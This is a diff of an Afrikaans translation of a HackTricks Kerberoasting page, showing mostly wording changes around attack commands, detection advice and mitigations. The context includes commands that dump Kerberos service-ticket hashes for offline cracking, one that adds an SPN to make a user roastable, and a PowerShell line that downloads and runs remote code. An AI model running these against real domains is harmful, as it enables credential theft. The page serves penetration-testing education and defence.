@@ -1,6 +1,6 @@
 # Kerberoast
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
 Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en **outomatiese werksvloei** te bou met behulp van die wêreld se **mees gevorderde** gemeenskaplike gereedskap.\
@@ -10,7 +10,7 @@ Kry Toegang Vandag:
 
 <details>
 
-<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hakwerk van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
@@ -24,7 +24,7 @@ Ander maniere om HackTricks te ondersteun:
 
 ## Kerberoast
 
-Kerberoasting fokus op die verkryging van **TGS-tikette**, spesifiek dié wat verband hou met dienste wat onder **gebruikersrekeninge** in **Active Directory (AD)** werk, met uitsluiting van **rekenaargebruikersrekeninge**. Die versleuteling van hierdie tikette maak gebruik van sleutels wat afkomstig is van **gebruikerswagwoorde**, wat die moontlikheid van **offline wagwoordkraak** bied. Die gebruik van 'n gebruikersrekening as 'n diens word aangedui deur 'n nie-leë **"ServicePrincipalName"** eienskap.
+Kerberoasting fokus op die verkryging van **TGS-tikette**, spesifiek dié wat verband hou met dienste wat onder **gebruikersrekeninge** in **Active Directory (AD)** werk, met uitsluiting van **rekenaargebruikersrekeninge**. Die versleuteling van hierdie tikette maak gebruik van sleutels wat afkomstig is van **gebruikerswagwoorde**, wat die moontlikheid van **offline geloofsbriekkraak** bied. Die gebruik van 'n gebruikersrekening as 'n diens word aangedui deur 'n nie-leë **"ServicePrincipalName"** eienskap.
 
 Vir die uitvoering van **Kerberoasting** is 'n domeinrekening wat in staat is om **TGS-tikette** aan te vra noodsaaklik; hierdie proses vereis egter nie **spesiale voorregte** nie, wat dit toeganklik maak vir enigiemand met **geldige domeinlegitimasie**.
 
@@ -33,13 +33,13 @@ Vir die uitvoering van **Kerberoasting** is 'n domeinrekening wat in staat is om
 * **Kerberoasting** teiken **TGS-tikette** vir **gebruikersrekeningdienste** binne **AD**.
 * Tikette wat versleutel is met sleutels van **gebruikerswagwoorde** kan **offline gekraak** word.
 * 'n Diens word geïdentifiseer deur 'n **ServicePrincipalName** wat nie nul is nie.
-* **Geen spesiale voorregte** is nodig nie, net **geldige domeinlegitimasie**.
+* Daar is geen **spesiale voorregte** nodig nie, net **geldige domeinlegitimasie**.
 
 ### **Aanval**
 
 {% hint style="warning" %}
-**Kerberoasting gereedskappe** vra gewoonlik **`RC4-versleuteling`** aan wanneer die aanval uitgevoer word en TGS-REQ-versoeke geïnisieer word. Dit is omdat **RC4 swakker is** en makliker offline gekraak kan word met gereedskappe soos Hashcat as ander versleutelingsalgoritmes soos AES-128 en AES-256.\
-RC4 (tipe 23) hasies begin met **`$krb5tgs$23$*`** terwyl AES-256 (tipe 18) begin met **`$krb5tgs$18$*`**.
+**Kerberoasting gereedskappe** vra gewoonlik **`RC4-versleuteling`** aan wanneer die aanval uitgevoer word en TGS-REQ-versoeke geïnisieer word. Dit is omdat **RC4** [**swakker**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) is en makliker offline gekraak kan word met gereedskappe soos Hashcat as ander versleutelingsalgoritmes soos AES-128 en AES-256.\
+RC4 (tipe 23) hasings begin met **`$krb5tgs$23$*`** terwyl AES-256 (tipe 18) begin met **`$krb5tgs$18$*`**.
 {% endhint %}
 
 #### **Linux**
@@ -53,7 +53,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-### Veelkenmerk-gereedskap insluitend 'n dump van kerberoastbare gebruikers:
+### Veelkenmerkende gereedskap insluitend 'n dump van kerberoastbare gebruikers:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -104,13 +104,13 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% hint style="warning" %}
-Wanneer 'n TGS aangevra word, word Windows-gebeurtenis `4769 - 'n Kerberos-dienskaartjie is aangevra` gegenereer.
+Wanneer 'n TGS aangevra word, word Windows gebeurtenis `4769 - 'n Kerberos-dienskaart is aangevra` gegenereer.
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) om maklik **werkstrome te bou** en outomatiseer wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
+Gebruik [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) om maklik **werkstrome** te bou en outomatiseer wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
 Kry Toegang Vandag:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -127,7 +127,7 @@ Indien jy genoeg **regte** oor 'n gebruiker het, kan jy dit **kerberoastbaar maa
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-Jy kan nuttige **hulpmiddels** vir **kerberoast** aanvalle hier vind: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+Jy kan nuttige **gereedskap** vir **kerberoast** aanvalle hier vind: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
 As jy hierdie **fout** vanaf Linux vind: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** is dit as gevolg van jou plaaslike tyd, jy moet die gasheer met die DC synchroniseer. Daar is 'n paar opsies:
 
@@ -140,7 +140,7 @@ Kerberoasting kan met 'n hoë graad van heimlikheid uitgevoer word as dit uitgeb
 
 * Die diensnaam moet nie **krbtgt** wees nie, aangesien dit 'n normale versoek is.
 * Diensname wat eindig met **$** moet uitgesluit word om insluiting van rekeninge wat vir dienste gebruik word, te voorkom.
-* Versoeke vanaf masjiene moet uitgefilter word deur rekeningname wat geformateer is as **masjien@domain** uit te sluit.
+* Versoeke vanaf masjiene moet uitgefilter word deur rekeningname wat in die formaat **masjien@domain** geformateer is, uit te sluit.
 * Slegs suksesvolle kaartjieversoeke moet oorweeg word, geïdentifiseer deur 'n mislukkingskode van **'0x0'**.
 * **Die belangrikste**, die kaartjieversleutelingstipe moet **0x17** wees, wat dikwels in Kerberoasting aanvalle gebruik word.
 ```bash
@@ -148,14 +148,14 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 ```
 Om die risiko van Kerberoasting te verminder:
 
-* Verseker dat **Diensrekeningwagwoorde moeilik is om te raai**, met 'n aanbeveling van meer as **25 karakters**.
-* Maak gebruik van **Bestuurde Diensrekeninge**, wat voordele soos **outomatiese wagwoordveranderinge** en **gedelegerde Diensprinsipaalnaam (SPN) Bestuur** bied, wat die sekuriteit teen sulke aanvalle versterk.
+* Verseker dat **Diensrekeningwagwoorde moeilik is om te raai**, met 'n aanbeveling van 'n lengte van meer as **25 karakters**.
+* Maak gebruik van **Bestuurde Diensrekeninge**, wat voordele soos **outomatiese wagwoordveranderings** en **gedelegerde Diensprinsipale Naam (SPN) Bestuur** bied, wat die sekuriteit teen sulke aanvalle verbeter.
 
 Deur hierdie maatreëls te implementeer, kan organisasies die risiko wat met Kerberoasting geassosieer word aansienlik verminder.
 
 ## Kerberoast sonder domeinrekening
 
-In **September 2022** is 'n nuwe manier om 'n stelsel te benut aan die lig gebring deur 'n navorser genaamd Charlie Clark, gedeel deur sy platform [exploit.ph](https://exploit.ph/). Hierdie metode maak die verkryging van **Dienskaartjies (ST)** moontlik deur 'n **KRB\_AS\_REQ** versoek, wat opmerklik nie beheer oor enige Aktiewe Adresboek-rekening vereis nie. In wese, as 'n hoof so opgestel is dat dit nie vooraf-gemagtiging vereis nie—'n scenario soortgelyk aan wat in die sibersekuriteitswêreld bekend staan as 'n **AS-REP Roasting-aanval**—kan hierdie eienskap benut word om die versoekproses te manipuleer. Spesifiek, deur die **sname** kenmerk binne die versoek se liggaam te verander, word die stelsel mislei om 'n **ST** uit te reik eerder as die standaard versleutelde Kaartjie-verleningstiket (TGT).
+In **September 2022** is 'n nuwe manier om 'n stelsel te benut aan die lig gebring deur 'n navorser genaamd Charlie Clark, gedeel deur sy platform [exploit.ph](https://exploit.ph/). Hierdie metode maak die verkryging van **Dienskaartjies (ST)** moontlik deur 'n **KRB\_AS\_REQ** versoek, wat opmerklik nie beheer oor enige Aktiewe Gids-rekening vereis nie. In wese, as 'n hoof so opgestel is dat dit nie vooraf-gemagtiging vereis nie—'n scenario soortgelyk aan wat in die sibersekuriteitswêreld bekend staan as 'n **AS-REP Roasting-aanval**—kan hierdie eienskap benut word om die versoekproses te manipuleer. Spesifiek, deur die **sname** kenmerk binne die versoek se liggaam te verander, word die stelsel mislei om 'n **ST** uit te reik eerder as die standaard versleutelde Kaartjie-verleningstelsel (TGT).
 
 Die tegniek word volledig verduidelik in hierdie artikel: [Semperis blogpos](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -191,14 +191,14 @@ Ander maniere om HackTricks te ondersteun:
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome te bou en outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
+Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en **outomatiseer werkstrome** te bou wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
 Kry Vandag Toegang:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
